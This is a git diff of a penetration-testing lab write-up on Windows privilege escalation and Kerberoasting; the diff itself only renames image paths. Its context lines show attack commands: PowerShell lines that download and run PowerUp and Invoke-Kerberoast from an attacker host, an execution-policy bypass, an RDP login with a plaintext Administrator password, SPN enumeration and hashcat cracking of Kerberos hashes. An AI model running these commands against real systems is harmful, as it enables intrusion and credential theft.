@@ -31,11 +31,11 @@ Invoke-AllChecks
 <strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -52,7 +52,7 @@ xfreerdp +clipboard /u:"Administrator" /v:$VICTIM:3389 /size:1024x568 /smart-siz
 Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Kerberoasting
 
@@ -64,7 +64,7 @@ Run the below command from the Administrator account we just got access to.
 setspn -T medin -Q ​ */*
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -86,7 +86,7 @@ powershell -ep bypass
 powershell -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.131.240:81/Invoke-Kerberoast.ps1'))"
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>
 
 Run this to get rid of all the spaces.
 
@@ -105,7 +105,7 @@ hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyo.txt --force
 hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt --force --show
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
